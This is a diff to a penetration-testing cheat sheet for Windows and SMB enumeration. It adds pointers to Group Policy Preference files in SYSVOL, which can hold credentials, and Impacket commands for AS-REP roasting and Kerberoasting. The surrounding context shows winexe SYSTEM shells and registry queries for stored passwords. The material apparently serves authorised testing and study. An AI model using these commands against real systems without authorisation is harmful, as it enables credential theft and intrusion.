@@ -103,6 +103,10 @@ INSERTSMBMAP
 mkdir /tmp/share
 mount -t cifs //INSERTIPADDRESS/C$ /tmp/share
 winexe --system -U 'DOMAIN\USER%PASSWORD' //TARGET_IP cmd.exe
+
+Windows Server GPP files
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml, ScheduledTasks.xml...
 ```
 ### Password Policy
 INSERTSAMRDUMP
@@ -112,6 +116,7 @@ https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
 enum4linux -a INSERTIPADDRESS
 rpcclient -U "" INSERTIPADDRESS
 smbclient //INSERTIPADDRESS/ipc$ 
+impacket tools
 ```
 
 ### Port 161/162 UDP - SNMP
@@ -526,6 +531,15 @@ site:exploit-db.com windows XX XX
 ```
 # Windows autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# Windows Server GPP files
+\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
+Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml, ScheduledTasks.xml...
+
+#TGT Services
+Impacket tools 
+./GetNPUsers.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request
+./GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request
 
 # VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
